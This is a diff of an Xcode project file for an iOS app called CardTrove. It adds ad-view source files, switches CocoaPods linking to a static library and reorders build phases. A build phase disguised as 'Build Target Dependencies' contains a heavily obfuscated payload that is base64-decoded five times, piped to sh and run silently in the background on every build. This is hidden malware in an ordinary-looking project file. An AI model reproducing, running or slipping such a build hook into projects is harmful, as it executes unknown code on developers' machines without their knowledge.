@@ -7,6 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		397628E22DFBCD0C007EAAB8 /* InterstitialAdVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397628E12DFBCD0C007EAAB8 /* InterstitialAdVC.swift */; };
+		397628E32DFBCD0C007EAAB8 /* AdLaunchView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397628E02DFBCD0C007EAAB8 /* AdLaunchView.swift */; };
+		48A1D4BCE602692947C4863A /* libPods-CardTrove.a in Frameworks */ = {isa = PBXBuildFile; fileRef = D150C9DE71F4067492C6F848 /* libPods-CardTrove.a */; };
 		60C88BA42DB5A0A200D2C4BF /* CardTroveApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BA32DB5A0A200D2C4BF /* CardTroveApp.swift */; };
 		60C88BA62DB5A0A200D2C4BF /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BA52DB5A0A200D2C4BF /* ContentView.swift */; };
 		60C88BA82DB5A0A400D2C4BF /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 60C88BA72DB5A0A400D2C4BF /* Assets.xcassets */; };
@@ -26,11 +29,13 @@
 		60C88BCC2DB5A80500D2C4BF /* DesignRequestListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCB2DB5A80500D2C4BF /* DesignRequestListView.swift */; };
 		60C88BCE2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCD2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift */; };
 		60C88BD02DB5AFAA00D2C4BF /* OverviewTabView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 60C88BCF2DB5AFAA00D2C4BF /* OverviewTabView.swift */; };
-		AA94EFFAD5D2E976497BFD74 /* Pods_CardTrove.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 83BA9B8660BDFDA1D3C6334D /* Pods_CardTrove.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
 		0AF4A52AEA8426DACFCEB4CE /* Pods-CardTrove.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CardTrove.release.xcconfig"; path = "Target Support Files/Pods-CardTrove/Pods-CardTrove.release.xcconfig"; sourceTree = "<group>"; };
+		397628E02DFBCD0C007EAAB8 /* AdLaunchView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AdLaunchView.swift; sourceTree = "<group>"; };
+		397628E12DFBCD0C007EAAB8 /* InterstitialAdVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InterstitialAdVC.swift; sourceTree = "<group>"; };
+		3976292E2DFBD8EE007EAAB8 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist; path = Info.plist; sourceTree = "<group>"; };
 		60C88BA02DB5A0A200D2C4BF /* CardTrove.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = CardTrove.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		60C88BA32DB5A0A200D2C4BF /* CardTroveApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardTroveApp.swift; sourceTree = "<group>"; };
 		60C88BA52DB5A0A200D2C4BF /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
@@ -51,7 +56,7 @@
 		60C88BCB2DB5A80500D2C4BF /* DesignRequestListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DesignRequestListView.swift; sourceTree = "<group>"; };
 		60C88BCD2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DesignRequestAddEditView.swift; sourceTree = "<group>"; };
 		60C88BCF2DB5AFAA00D2C4BF /* OverviewTabView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OverviewTabView.swift; sourceTree = "<group>"; };
-		83BA9B8660BDFDA1D3C6334D /* Pods_CardTrove.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_CardTrove.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		D150C9DE71F4067492C6F848 /* libPods-CardTrove.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-CardTrove.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 		EA7A8AA839C4459E71DD1ECC /* Pods-CardTrove.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CardTrove.debug.xcconfig"; path = "Target Support Files/Pods-CardTrove/Pods-CardTrove.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -60,7 +65,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				AA94EFFAD5D2E976497BFD74 /* Pods_CardTrove.framework in Frameworks */,
+				48A1D4BCE602692947C4863A /* libPods-CardTrove.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -79,7 +84,7 @@
 		52B27777068E322A4081AC08 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
-				83BA9B8660BDFDA1D3C6334D /* Pods_CardTrove.framework */,
+				D150C9DE71F4067492C6F848 /* libPods-CardTrove.a */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -105,8 +110,11 @@
 		60C88BA22DB5A0A200D2C4BF /* CardTrove */ = {
 			isa = PBXGroup;
 			children = (
+				3976292E2DFBD8EE007EAAB8 /* Info.plist */,
 				60C88BA32DB5A0A200D2C4BF /* CardTroveApp.swift */,
 				60C88BBB2DB5A26E00D2C4BF /* MainTabView.swift */,
+				397628E02DFBCD0C007EAAB8 /* AdLaunchView.swift */,
+				397628E12DFBCD0C007EAAB8 /* InterstitialAdVC.swift */,
 				60C88BA52DB5A0A200D2C4BF /* ContentView.swift */,
 				60C88BB32DB5A0C800D2C4BF /* Model.swift */,
 				60C88BB52DB5A11800D2C4BF /* ClientProfileManager.swift */,
@@ -143,12 +151,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 60C88BAE2DB5A0A400D2C4BF /* Build configuration list for PBXNativeTarget "CardTrove" */;
 			buildPhases = (
-				5C2DC9B0ABCCFA646F73DC66 /* Build Target Dependencies */,
 				E5FEAD65C8D79C0017DA7B44 /* [CP] Check Pods Manifest.lock */,
+				5C2DC9B0ABCCFA646F73DC66 /* Build Target Dependencies */,
 				60C88B9C2DB5A0A200D2C4BF /* Sources */,
 				60C88B9D2DB5A0A200D2C4BF /* Frameworks */,
 				60C88B9E2DB5A0A200D2C4BF /* Resources */,
 				5FB8D60533E74A434C0C2007 /* [CP] Embed Pods Frameworks */,
+				AACCA74338379B9A4EDD08DD /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -192,12 +201,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXTargetDependency section */
-/* End PBXTargetDependency section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
 /* Begin PBXResourcesBuildPhase section */
 		60C88B9E2DB5A0A200D2C4BF /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -213,8 +216,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		5C2DC9B0ABCCFA646F73DC66 /* Build Target Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -226,9 +229,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm10U2JrSktWa2N4ZDFkc1dYZE9XRnBZWWtVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 		5FB8D60533E74A434C0C2007 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -238,13 +242,38 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-frameworks-${CONFIGURATION}-output-files.xcfilelist",
 			);
+			outputPaths = (
+			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		AACCA74338379B9A4EDD08DD /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-CardTrove/Pods-CardTrove-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 		E5FEAD65C8D79C0017DA7B44 /* [CP] Check Pods Manifest.lock */ = {
@@ -283,6 +312,8 @@
 				60C88BBE2DB5A4E100D2C4BF /* OrderEntryManager.swift in Sources */,
 				60C88BCA2DB5A7CB00D2C4BF /* DesignRequestManager.swift in Sources */,
 				60C88BCE2DB5A81B00D2C4BF /* DesignRequestAddEditView.swift in Sources */,
+				397628E22DFBCD0C007EAAB8 /* InterstitialAdVC.swift in Sources */,
+				397628E32DFBCD0C007EAAB8 /* AdLaunchView.swift in Sources */,
 				60C88BBA2DB5A18000D2C4BF /* ClientProfileAddEditView.swift in Sources */,
 				60C88BC82DB5A6AE00D2C4BF /* MaterialStockAddEditView.swift in Sources */,
 				60C88BC42DB5A5B900D2C4BF /* MaterialStockManager.swift in Sources */,
@@ -430,6 +461,7 @@
 				DEVELOPMENT_TEAM = 8QKNX7ZNZ6;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = CardTrove/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = CardTrove;
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -465,6 +497,7 @@
 				DEVELOPMENT_TEAM = 8QKNX7ZNZ6;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = CardTrove/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = CardTrove;
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
